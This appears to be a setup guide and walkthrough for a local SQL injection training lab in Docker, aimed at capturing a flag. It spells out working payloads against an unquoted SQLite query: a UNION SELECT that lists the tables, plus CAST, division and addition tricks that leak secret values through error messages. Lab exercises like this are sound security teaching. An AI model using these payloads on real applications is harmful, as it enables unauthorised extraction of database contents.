# SQL Injection Error-Based Lab - Setup Guide

## Quick Start

```bash
chmod +x start.sh
./start.sh
```

## Walkthrough

### Understanding the Vulnerability

Query: `SELECT id, name, department, email FROM employees WHERE id = <INPUT>`

The input is not quoted, allowing direct SQL injection.

### Step 1: Discover Hidden Tables

```
id=1 AND 1=0 UNION SELECT name,sql,3,4 FROM sqlite_master WHERE type='table'
```

Reveals: `employees` and `__internal_config`

### Step 2: Extract Flag via Error

**Method: CAST Type Conversion**

```
id=CAST((SELECT config_value FROM __internal_config WHERE config_key='secret_flag') AS INTEGER)
```

SQLite tries to convert `IDS{...}` to integer, fails, and errors with the value in the message.

### Alternative Methods

```
# Division by zero
id=(SELECT config_value FROM __internal_config WHERE config_key='secret_flag') / 0

# Addition
id=(SELECT config_value FROM __internal_config) + 0
```

## Clean Start

```bash
docker stop sqli-lab-error && docker rm sqli-lab-error
rm -rf app/database/
```
